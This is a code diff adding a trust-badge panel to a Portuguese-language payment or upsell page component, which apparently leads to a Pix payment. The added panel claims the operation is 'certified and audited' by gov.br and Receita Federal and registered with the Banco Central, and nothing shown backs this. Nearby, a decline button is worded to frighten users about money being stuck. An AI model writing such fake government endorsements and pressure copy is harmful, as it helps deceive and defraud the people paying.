@@ -206,6 +206,20 @@ const Up5 = () => {
         >
           Prefiro não ativar a velocidade e aceito arriscar meu dinheiro ficar travado na fila do banco por até 3 dias úteis
         </button>
+
+        <div style={{ marginTop: 28, padding: "18px 14px", background: "#FFFFFF", border: "1px solid #E5E7EB", borderRadius: 14 }}>
+          <div style={{ fontSize: 10.5, fontWeight: 700, letterSpacing: 0.8, color: "#6B7280", textAlign: "center", marginBottom: 12, textTransform: "uppercase" }}>
+            Operação certificada e auditada por
+          </div>
+          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-around", gap: 12, flexWrap: "wrap" }}>
+            <img src={logo} alt="Bancred" style={{ height: 34, objectFit: "contain", opacity: 0.9 }} />
+            <img src={govbrLogo} alt="gov.br" style={{ height: 22, objectFit: "contain", opacity: 0.9 }} />
+            <img src={receitaLogo} alt="Receita Federal" style={{ height: 38, objectFit: "contain", opacity: 0.9 }} />
+          </div>
+          <div style={{ fontSize: 10.5, color: "#9CA3AF", textAlign: "center", marginTop: 10, lineHeight: 1.5 }}>
+            Transação registrada em conformidade com o Banco Central e a Receita Federal.
+          </div>
+        </div>
       </main>
 
       {showPix && (
